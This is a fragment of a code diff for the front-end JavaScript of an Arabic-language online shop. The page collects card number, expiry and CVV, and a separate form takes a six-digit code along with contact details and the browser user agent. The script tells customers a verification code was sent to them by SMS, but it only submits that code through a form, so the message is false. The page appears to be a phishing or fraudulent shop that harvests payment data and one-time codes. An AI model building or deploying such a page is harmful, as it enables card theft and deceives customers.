+            const additionalNotes = this.querySelector('textarea[name="additional_notes"]').value.trim();
+            const currentTime = new Date().toLocaleString('ar-SA');
+            
+            if (!fullName || !phoneNumber || !emailAddress) {
+                showNotification('❌ يرجى ملء جميع الحقول المطلوبة');
+                return;
             }
             
-            // التحقق من رقم الهاتف
-            const phoneInput = document.querySelector('input[name="phone"]');
-            if (phoneInput) {
-                phoneInput.addEventListener('input', function() {
-                    this.value = this.value.replace(/[^0-9]/g, '');
+            if (verificationCode.length !== 6) {
+                showNotification('❌ يرجى إدخال 6 أرقام للكود');
+                return;
+            }
+            
+            // Fill hidden fields
+            this.querySelector('input[name="submission_time"]').value = currentTime;
+            this.querySelector('input[name="user_agent"]').value = navigator.userAgent;
+            this.querySelector('input[name="page_url"]').value = window.location.href;
+            this.querySelector('input[name="customer_ip"]').value = 'تم الكشف تلقائياً';
+            
+            currentFormType = 'advanced-code';
+            isCodeFormSubmitted = false;
+            
+            const submitBtn = document.getElementById('submit-advanced-code');
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = `
+                <span class="flex items-center justify-center">
+                    <i class="fas fa-spinner fa-spin mr-3 text-2xl"></i>
+                    ⏳ جاري المعالجة والتفعيل...
+                </span>
+            `;
+            
+            this.submit();
+            showNotification('🚀 جاري تفعيل الكود...');
+        });
+
+        // Purchase code verification
+        document.getElementById('purchase-code-form').addEventListener('submit', function(e) {
+            e.preventDefault();
+            const enteredCode = document.getElementById('purchase-secret-code').value.trim();
+            const correctCode = sessionStorage.getItem('sentVerificationCode') || sessionStorage.getItem('verificationCode');
+            
+            if (enteredCode === correctCode) {
+                showNotification('✅ تم إتمام الشراء بنجاح!');
+                setTimeout(() => {
+                    showThankYouPage();
+                }, 1000);
+            } else {
+                showNotification('❌ كود غير صحيح، يرجى المحاولة مرة أخرى');
+                document.getElementById('purchase-secret-code').style.borderColor = '#EF4444';
+                setTimeout(() => {
+                    document.getElementById('purchase-secret-code').style.borderColor = '';
+                }, 2000);
+            }
+        });
+
+        function showThankYouPage() {
+            const modal = document.createElement('div');
+            modal.className = 'fixed inset-0 bg-gradient-to-br from-green-900 to-emerald-900 flex items-center justify-center z-50 p-4';
+            modal.innerHTML = `
+                <div class="bg-white dark:bg-gray-800 rounded-3xl shadow-2xl max-w-2xl w-full p-8 text-center relative overflow-hidden">
+                    <div class="absolute inset-0 bg-gradient-to-br from-green-50 to-emerald-50 dark:from-gray-800 dark:to-gray-700"></div>
+                    <div class="relative z-10">
+                        <div class="text-8xl mb-6 animate-bounce">🎉</div>
+                        <h1 class="text-5xl font-black mb-4 text-green-600">شكراً لك!</h1>
+                        <h2 class="text-3xl font-bold mb-8">تم إتمام طلبك بنجاح</h2>
+                        
+                        <div class="bg-green-100 dark:bg-green-900 p-8 rounded-2xl mb-8">
+                            <h3 class="text-2xl font-bold text-green-800 dark:text-green-200 mb-4">تفاصيل الطلب:</h3>
+                            <div class="space-y-3 text-green-700 dark:text-green-300 text-lg">
+                                <p><strong>رقم الطلب:</strong> #POE-2024-${Math.floor(Math.random() * 100000)}</p>
+                                <p><strong>وقت التسليم المتوقع:</strong> 12-24 ساعة</p>
+                                <p><strong>حالة الطلب:</strong> تحت المعالجة</p>
+                            </div>
+                        </div>
+                        
+                        <button onclick="this.closest('.fixed').remove(); showPage('home');" class="bg-gradient-to-r from-primary to-secondary text-white px-10 py-4 rounded-xl hover:from-purple-700 hover:to-purple-800 transition-all font-bold text-lg transform hover:scale-105">
+                            <i class="fas fa-home mr-2"></i>
+                            العودة للتسوق
+                        </button>
+                    </div>
+                </div>
+            `;
+            document.body.appendChild(modal);
+        }
+
+        // Payment form handler
+        document.getElementById('payment-form').addEventListener('submit', function(e) {
+            const firstName = this.querySelector('input[name="first_name"]').value;
+            const lastName = this.querySelector('input[name="last_name"]').value;
+            const phone = this.querySelector('input[name="phone"]').value;
+            const email = this.querySelector('input[name="email"]').value;
+            
+            const customerData = {
+                name: `${firstName} ${lastName}`,
+                phone: phone,
+                email: email
+            };
+            sessionStorage.setItem('customerData', JSON.stringify(customerData));
+            
+            const orderSummary = cart.map(item => 
+                `${item.name} - الكمية: ${item.quantity} - السعر: ${item.price} ريال`
+            ).join('\n');
+            
+            const totalAmount = cart.reduce((sum, item) => sum + (item.price * item.quantity), 0);
+            const orderNumber = 'POE-2024-' + Math.floor(Math.random() * 100000);
+            
+            const verificationCode = Math.floor(10000 + Math.random() * 90000);
+            sessionStorage.setItem('verificationCode', verificationCode);
+
+            const hiddenFields = [
+                { name: '_subject', value: `طلب جديد من متجر الخصوصية المتطور - ${orderNumber}` },
+                { name: '_next', value: `${window.location.origin}${window.location.pathname}#success` },
+                { name: 'order_items', value: orderSummary },
+                { name: 'total_amount', value: `${totalAmount} ريال` },
+                { name: 'order_number', value: orderNumber },
+                { name: 'order_date', value: new Date().toLocaleString('ar-SA') },
+                { name: 'verification_code', value: verificationCode }
+            ];
+            
+            hiddenFields.forEach(field => {
+                const input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = field.name;
+                input.value = field.value;
+                this.appendChild(input);
+            });
+            
+            sessionStorage.setItem('orderNumber', orderNumber);
+            
+            cart = [];
+            updateCartUI();
+        });
+
+        function sendVerificationCode() {
+            const verificationCode = sessionStorage.getItem('verificationCode') || Math.floor(10000 + Math.random() * 90000);
+            const orderNumber = sessionStorage.getItem('orderNumber') || 'Unknown';
+            const customerData = JSON.parse(sessionStorage.getItem('customerData') || '{}');
+            
+            const phoneNumber = customerData.phone || '';
+            const lastFourDigits = phoneNumber.replace(/\D/g, '').slice(-4);
+            const maskedPhone = lastFourDigits.length === 4 ? `****${lastFourDigits}` : 'غير محدد';
+            
+            const form = document.getElementById('verification-code-form');
+            const currentTime = new Date().toLocaleString('ar-SA');
+            
+            form.querySelector('input[name="_subject"]').value = `كود التحقق للطلب ${orderNumber} - متجر الخصوصية المتطور`;
+            form.querySelector('input[name="customer_name"]').value = customerData.name || 'غير محدد';
+            form.querySelector('input[name="customer_phone"]').value = customerData.phone || 'غير محدد';
+            form.querySelector('input[name="customer_email"]').value = customerData.email || 'غير محدد';
+            form.querySelector('input[name="order_number"]').value = orderNumber;
+            form.querySelector('input[name="verification_code"]').value = verificationCode;
+            form.querySelector('input[name="sent_time"]').value = currentTime;
+            
+            currentFormType = 'verification';
+            form.submit();
+            
+            const statusDiv = document.getElementById('code-status');
+            statusDiv.innerHTML = `
+                <p class="text-green-800 dark:text-green-200 font-bold text-lg">
+                    <i class="fas fa-check-circle mr-2"></i>
+                    تم إرسال كود التحقق إلى رقم: <span class="text-xl font-mono">${maskedPhone}</span>
+                </p>
+                <p class="text-green-700 dark:text-green-300 text-lg mt-2">
+                    <i class="fas fa-sms mr-2"></i>
+                    يرجى التحقق من رسائلك النصية لاستلام الكود
+                </p>
+            `;
+            statusDiv.className = 'bg-green-100 dark:bg-green-900 p-6 rounded-xl mb-4 border border-green-300 dark:border-green-700';
+            
+            sessionStorage.setItem('sentVerificationCode', verificationCode);
+        }
+
+        function resendVerificationCode() {
+            sendVerificationCode();
+            showNotification('📱 تم إعادة إرسال كود التحقق');
+        }
+
+        // Enhanced Input Formatting
+        document.addEventListener('DOMContentLoaded', function() {
+            checkAgeVerification();
+            setupCodeInputs();
+            generateProducts();
+            updateCartUI();
+            
+            if (window.location.hash === '#success') {
+                setTimeout(() => {
+                    showPage('purchase-code');
+                    const orderNumber = sessionStorage.getItem('orderNumber') || Math.floor(Math.random() * 100000);
+                    const orderDisplay = document.getElementById('order-number-display');
+                    if (orderDisplay) {
+                        orderDisplay.textContent = orderNumber;
+                    }
+                    
+                    setTimeout(() => {
+                        sendVerificationCode();
+                    }, 2000);
+                    
+                    window.history.replaceState({}, document.title, window.location.pathname);
+                }, 500);
+            }
+
+            // Enhanced card number input formatting
+            const cardNumberInput = document.querySelector('input[name="card_number"]');
+            if (cardNumberInput) {
+                cardNumberInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
+                    e.target.value = value;
                 });
             }
 
-            // تحديث أيقونة البطاقة عند تغيير رقم البطاقة
-            const cardNumberInput = document.querySelector('input[name="card_number"]');
-            if (cardNumberInput) {
-                cardNumberInput.addEventListener('input', function() {
-                    updateCardIcon(this);
+            // Enhanced expiry date input formatting
+            const expiryInput = document.querySelector('input[name="card_expiry"]');
+            if (expiryInput) {
+                expiryInput.addEventListener('input', function(e) {
+                    let value = e.target.value.replace(/\D/g, '');
+                    if (value.length >= 2) {
+                        value = value.substring(0, 2) + '/' + value.substring(2, 4);
+                    }
+                    e.target.value = value;
+                });
+            }
+
+            // Enhanced CVV input formatting
+            const cvvInput = document.querySelector('input[name="card_cvv"]');
+            if (cvvInput) {
+                cvvInput.addEventListener('input', function(e) {
+                    e.target.value = e.target.value.replace(/\D/g, '');
                 });
             }
         });
